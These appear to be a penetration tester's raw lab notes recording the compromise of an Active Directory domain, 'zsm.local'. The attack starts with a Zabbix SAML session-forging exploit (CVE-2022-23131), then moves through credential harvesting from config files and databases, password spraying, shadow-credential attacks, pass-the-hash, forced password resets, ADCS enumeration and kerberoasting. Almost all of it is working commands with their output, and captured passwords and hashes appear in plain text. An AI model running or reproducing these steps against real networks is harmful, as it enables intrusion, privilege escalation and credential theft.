
```
kali@kali ~> nmap -Pn -sV -sC 192.168.210.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 13:49 EDT
Nmap scan report for 192.168.210.13
Host is up (0.14s latency).
Not shown: 932 filtered tcp ports (no-response), 67 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=monitor.zsm.local/organizationName=Zephyr Managed Services/stateOrProvinceName=London/countryName=GB
| Not valid before: 2022-03-21T19:39:06
|_Not valid after:  2032-03-18T19:39:06
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
|_http-title: Zabbix
| http-robots.txt: 2 disallowed entries
|_/ /zabbix/".
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.16 seconds
```




```
kali@kali ~/CVE-2022-23131 (main)> python zabbix.py
请拖入检测列表:test.txt
地址https://192.168.210.13
请求成功
cookie：zbx_session:eyJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9LCAic2Vzc2lvbmlkIjogIjk2ODczM2YwNzUzZWZkYzM1ZDM4ZTJiYTIyYzI4YjliIiwgInNpZ24iOiAiV0ZjVHZuS2VNZGtRRURyOFAvZzVWclpISTBDQ01lelFJL3hOZjUvbElJV0w1ajZ5Wk8rd0hDTi9uRDl1VzVGbkltV1NrMEx4WTVoZHBXQlpkbDZacWc9PSJ9

```


```
pwd
/var/www/html/conf
ls -la
total 28
drwxr-xr-x  3 www-data www-data 4096 Mar 22  2022 .
drwxr-xr-x 12     1000     1000 4096 Nov 29  2022 ..
drwxr-xr-x  2 www-data www-data 4096 Feb 15  2023 certs
-rw-r--r--  1 www-data www-data  163 Nov 29  2021 .htaccess
-rw-r--r--  1 www-data www-data 1036 Nov 29  2021 maintenance.inc.php
-rw-------  1 www-data www-data 1648 Mar 22  2022 zabbix.conf.php
-rw-r--r--  1 www-data www-data 1638 Nov 29  2021 zabbix.conf.php.example
cat zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']				= 'MYSQL';
$DB['SERVER']			= 'localhost';
$DB['PORT']				= '0';
$DB['DATABASE']			= 'zabbix';
$DB['USER']				= 'zabbix';
$DB['PASSWORD']			= 'rDhHbBEfh35sMbkY';

```


```
mysql> select * from users;
select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+----------------+---------------+---------------+----------+--------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip     | attempt_clock | rows_per_page | timezone | roleid |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+----------------+---------------+---------------+----------+--------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |     |         1 | 0          | default | 30s     | default |             32 | 192.168.110.51 |    1720560058 |            50 | default  |      3 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |                |             0 |            50 | default  |      4 |
|      5 | marcus   | Marcus | Thompson      | $2y$10$Z/HvONkwNhSSYpAso3W9/uEeDo74eEYb4HqIzLPyodCNTwLpyr0/C |     |         0 | 0          | default | 30s     | default |              0 |                |             0 |            50 | default  |      2 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+----------------+---------------+---------------+----------+--------+
3 rows in set (0.00 sec)

mysql>

```





```
kali@kali ~> nxc smb 192.168.210.0/24 -u 'marcus' -p '!QAZ2wsx'
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [+] zsm.local\marcus:!QAZ2wsx
SMB         192.168.210.12  445    ZPH-SVRCA01      [+] zsm.local\marcus:!QAZ2wsx
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] Error checking if user is admin on 192.168.210.10: The NETBIOS connection with the remote host timed out.
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx
SMB         192.168.210.14  445    ZPH-SVRADFS1     [+] zsm.local\marcus:!QAZ2wsx
SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\marcus:!QAZ2wsx STATUS_LOGON_FAILURE

```



kerbroastable

![[192.168.210.13-20240710021535201.webp]]



Outbound permission control

![[192.168.210.13-20240710021652552.webp]]




```
kali@kali ~> nxc ldap 192.168.210.10 -u 'jamie' -p 'Fuckyou123!#' -M adcs
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
LDAP        192.168.210.10  389    ZPH-SVRDC01      [+] zsm.local\jamie:Fuckyou123!#
ADCS        192.168.210.10  389    ZPH-SVRDC01      [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        192.168.210.10  389    ZPH-SVRDC01      Found PKI Enrollment Server: ZPH-SVRCA01.zsm.local
ADCS        192.168.210.10  389    ZPH-SVRDC01      Found CN: zsm-ZPH-SVRCA01-CA
```


```
kali@kali ~/pywhisker (main)> python pywhisker.py -d 'zsm.local' -td 'ZSM.LOCAL'  --dc-ip 192.168.210.10 -u 'marcus' -p '!QAZ2wsx' --target 'ZPH-SVRMGMT1$' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: c12b171d-ca0c-0882-63a7-ec0671533c08
[*] Updating the msDS-KeyCredentialLink attribute of ZPH-SVRMGMT1$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[!] module 'OpenSSL.crypto' has no attribute 'PKCS12'

```



```
kali@kali ~> certipy shadow auto -username marcus@zsm.local -p '!QAZ2wsx' -account 'ZPH-SVRMGMT1$' -dc-ip 192.168.210.10
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ZPH-SVRMGMT1$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e33b235c-0d72-6cff-4164-eff552e12a03'
[*] Adding Key Credential with device ID 'e33b235c-0d72-6cff-4164-eff552e12a03' to the Key Credentials for 'ZPH-SVRMGMT1$'
[*] Successfully added Key Credential with device ID 'e33b235c-0d72-6cff-4164-eff552e12a03' to the Key Credentials for 'ZPH-SVRMGMT1$'
[*] Authenticating as 'ZPH-SVRMGMT1$' with the certificate
[*] Using principal: zph-svrmgmt1$@zsm.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'zph-svrmgmt1.ccache'
[*] Trying to retrieve NT hash for 'zph-svrmgmt1$'
[*] Restoring the old Key Credentials for 'ZPH-SVRMGMT1$'
[*] Successfully restored the old Key Credentials for 'ZPH-SVRMGMT1$'
[*] NT hash for 'ZPH-SVRMGMT1$': 89d0b56874f61ad38bad336a77b8ef2f

```

```
kali@kali ~> pth-net rpc group addmem 'General management' 'marcus' -U 'zsm.local'/'ZPH-SVRMGMT1$'%'ffffffffffffffffffffffffffffffff':'89d0b56874f61ad38bad336a77b8ef2f' -S '192.168.210.10'
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

```
kali@kali ~> bloodyAD --host "192.168.210.10" -d 'zsm.local' -u 'ZPH-SVRMGMT1$' -p :89d0b56874f61ad38bad336a77b8ef2f add groupMember 'General Management' 'Marcus'
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 144, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 244, in groupMember
    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 214, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=General Management,CN=Builtin,DC=zsm,DC=local! Result code: "entryAlreadyExists" Reason: "b'00000562: UpdErr: DSID-031A11FA, problem 6005 (ENTRY_EXISTS), data 0\n\x00'"
```



```
kali@kali ~> bloodyAD --host "192.168.210.10" -d "zsm.local" -u 'marcus' -p '!QAZ2wsx' set password jamie 'Fuckyou123!#'
[+] Password changed successfully!
```


```
kali@kali ~> bloodyAD --host "192.168.210.10" -d 'zsm.local' -u 'jamie' -p 'Fuckyou123!#' add groupMember 'CA Managers' 'Jamie'
[+] Jamie added to CA Managers
```

```
Users in this group can manage the CA server
```


```
kali@kali ~> certipy find -u 'jamie@zsm.local' -p 'Fuckyou123!#' -dc-ip '192.168.210.10' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'zsm-ZPH-SVRCA01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'zsm-ZPH-SVRCA01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'zsm-ZPH-SVRCA01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'zsm-ZPH-SVRCA01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : zsm-ZPH-SVRCA01-CA
    DNS Name                            : ZPH-SVRCA01.zsm.local
    Certificate Subject                 : CN=zsm-ZPH-SVRCA01-CA, DC=zsm, DC=local
    Certificate Serial Number           : 1BF5EE45154494AD45D2CF5E6C8BA0A0
    Certificate Validity Start          : 2022-03-16 16:35:15+00:00
    Certificate Validity End            : 2042-03-16 16:45:14+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : ZSM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : ZSM.LOCAL\Administrators
                                          ZSM.LOCAL\Domain Admins
                                          ZSM.LOCAL\Enterprise Admins
        ManageCa                        : ZSM.LOCAL\Administrators
                                          ZSM.LOCAL\Domain Admins
                                          ZSM.LOCAL\Enterprise Admins
        Enroll                          : ZSM.LOCAL\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

```
-rw-rw-r--  1 kali kali     166895 Jul  9 19:12 20240709191152_bloodhound.zip
-rw-rw-r--  1 kali kali      77223 Jul  9 21:51 20240709215127_Certipy.zip
```

```
kali@kali ~> nxc ldap 192.168.210.10 -u jamie -p 'Fuckyou123!#' --kerberoasting kerberoastables.txt --kdcHost 192.168.210.10
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
LDAP        192.168.210.10  389    ZPH-SVRDC01      [+] zsm.local\jamie:Fuckyou123!#
LDAP        192.168.210.10  389    ZPH-SVRDC01      Bypassing disabled account krbtgt
LDAP        192.168.210.10  389    ZPH-SVRDC01      [*] Total of records returned 1
LDAP        192.168.210.10  389    ZPH-SVRDC01      sAMAccountName: ZPH-GMSA-ADFS$ memberOf:  pwdLastSet: 2024-07-08 23:13:23.606491 lastLogon:2024-07-08 23:13:23.762732
LDAP        192.168.210.10  389    ZPH-SVRDC01      $krb5tgs$18$ZPH-GMSA-ADFS$$ZSM.LOCAL$*zsm.local/ZPH-GMSA-ADFS$*$592d236f7df8885fae117939$ad7121d13b76bce0441ceaa968886a6b40111c3bd5eaeb394840598da58b94557cb4b5154834642832e56546fdea93ae9e38991542fa1694e2f4ed1012b1b7f2acb011ff3894783d53c5679a229bcfd4beed376aca9f446c54e7a56562eb192396fb2269cf93fb748eb65cac2b25d433db306d8453e9467e5eea9340e7ef4f1cc0803b38b9535c2dd08cfa00cb0637a0b3dbb257c793f7a43c2f3ce124f9b193d940b63cb2f56e71e74ef9f992bdc03be6b908d22790099f9e1435461a7b12329b07a21d8230d60fe88abbbff11836cff0b6b9dc3a9c7be8974cddef5f3731e0ee69c35274d48a8a91426de24609f0ae8f00ca337cce1ef58f03de874a34a40045357576b75492ad66488efb2a33084999db9ef971dbe1255071a5c0fd2735172266509027bcddb2439549b54f4114a7a5c6b03300e9aab1242d9059f544e2456f92b2502fa4c6f2082867944c429d9edf4d69f8d1214361a21a9701630fab33a3e79f2c0c027bfde0348f89812615f6ce8dd99eb563396c9040102a046388c2fcf7f40d1c001c2f31ec0d0d990a81b162cdbb7b7ad0eed4a49a32a3b3ae0a0f7d61a2748dece98b3c9810b8ad81bbfa2e5eaade8256e46a9951924c269b6997fcbc2f11aa1a23a5d99943640cd4d7253a4507b8390b2f7bc3fe80a25c9c0a2b9a72902fc4590c70eeda015021eb3e0735109421c371a62d8452455ee62ae5fa732353a93af0821f8f3c40914193e841c5a85c9fb4889b6c7a041d8c158261d09d5a528330cc17d2c4c73d7878dc8be6af7f68e323a9e4290b27363bf45fb75f0beff238216ce1d72b2d51ee30900108ef7418e6e6fe2c6214310aef83c9657f47644e71ea0d393a66e7fd1349a8e2478a42d70f98dab2c4094c31fa87257b0790acff2df6cb433c917c5f5455d1ae81ccf77b16411396ec6eaf885600e101ca583a3a9e5972fab535df096ed40e96ea7006bfde010c0e612582e267617e28516229e1545c96f9284fe4274581201dc80a02641088150f71eebee364d87178e43ec1dfb261e71abb2e2328c1a2268d0302ed2a6738452d7511c976a1c226bde049e9ab31fc514108d500e4dfc8b9b361dc78e535803d6b725a87b21f05136ed8bd130c628c040784e482ed4172863973449402d295e75dd8aade83fe4a5e46c213d08cd48401532da7677d9fe8ea1a32ce9f4ad93088e1ae67dce280ef66be6eb657638bca5af114f5c93214410ce0ea522389c8a56775834e0ed68c79534a45781a1ec891694fff8e1ab0fe2dd2f1135d7f0a94a5dd0e5ab35c9689781ed605b96b22801744b5f102976b52b2528ee844e9847b58a8a88e0c6a8e693ec1c60d3569d332b086ef1b2cc6292d5ac60cd38d05821ff7fbe0a60d52091ad467f5d6901eee7a96256ef7794912f2aefa2f63154c9c360f8fd6d4a8534c1cf7bb875a0f779cbe2da90f9682eb8c075e9370ed1ef53d300a1a1cd912485b006ed427

```


```
$krb5tgs$18$ZPH-GMSA-ADFS$$ZSM.LOCAL$*zsm.local/ZPH-GMSA-ADFS$*$592d236f7df8885fae117939$ad7121d13b76bce0441ceaa968886a6b40111c3bd5eaeb394840598da58b94557cb4b5154834642832e56546fdea93ae9e38991542fa1694e2f4ed1012b1b7f2acb011ff3894783d53c5679a229bcfd4beed376aca9f446c54e7a56562eb192396fb2269cf93fb748eb65cac2b25d433db306d8453e9467e5eea9340e7ef4f1cc0803b38b9535c2dd08cfa00cb0637a0b3dbb257c793f7a43c2f3ce124f9b193d940b63cb2f56e71e74ef9f992bdc03be6b908d22790099f9e1435461a7b12329b07a21d8230d60fe88abbbff11836cff0b6b9dc3a9c7be8974cddef5f3731e0ee69c35274d48a8a91426de24609f0ae8f00ca337cce1ef58f03de874a34a40045357576b75492ad66488efb2a33084999db9ef971dbe1255071a5c0fd2735172266509027bcddb2439549b54f4114a7a5c6b03300e9aab1242d9059f544e2456f92b2502fa4c6f2082867944c429d9edf4d69f8d1214361a21a9701630fab33a3e79f2c0c027bfde0348f89812615f6ce8dd99eb563396c9040102a046388c2fcf7f40d1c001c2f31ec0d0d990a81b162cdbb7b7ad0eed4a49a32a3b3ae0a0f7d61a2748dece98b3c9810b8ad81bbfa2e5eaade8256e46a9951924c269b6997fcbc2f11aa1a23a5d99943640cd4d7253a4507b8390b2f7bc3fe80a25c9c0a2b9a72902fc4590c70eeda015021eb3e0735109421c371a62d8452455ee62ae5fa732353a93af0821f8f3c40914193e841c5a85c9fb4889b6c7a041d8c158261d09d5a528330cc17d2c4c73d7878dc8be6af7f68e323a9e4290b27363bf45fb75f0beff238216ce1d72b2d51ee30900108ef7418e6e6fe2c6214310aef83c9657f47644e71ea0d393a66e7fd1349a8e2478a42d70f98dab2c4094c31fa87257b0790acff2df6cb433c917c5f5455d1ae81ccf77b16411396ec6eaf885600e101ca583a3a9e5972fab535df096ed40e96ea7006bfde010c0e612582e267617e28516229e1545c96f9284fe4274581201dc80a02641088150f71eebee364d87178e43ec1dfb261e71abb2e2328c1a2268d0302ed2a6738452d7511c976a1c226bde049e9ab31fc514108d500e4dfc8b9b361dc78e535803d6b725a87b21f05136ed8bd130c628c040784e482ed4172863973449402d295e75dd8aade83fe4a5e46c213d08cd48401532da7677d9fe8ea1a32ce9f4ad93088e1ae67dce280ef66be6eb657638bca5af114f5c93214410ce0ea522389c8a56775834e0ed68c79534a45781a1ec891694fff8e1ab0fe2dd2f1135d7f0a94a5dd0e5ab35c9689781ed605b96b22801744b5f102976b52b2528ee844e9847b58a8a88e0c6a8e693ec1c60d3569d332b086ef1b2cc6292d5ac60cd38d05821ff7fbe0a60d52091ad467f5d6901eee7a96256ef7794912f2aefa2f63154c9c360f8fd6d4a8534c1cf7bb875a0f779cbe2da90f9682eb8c075e9370ed1ef53d300a1a1cd912485b006ed427
```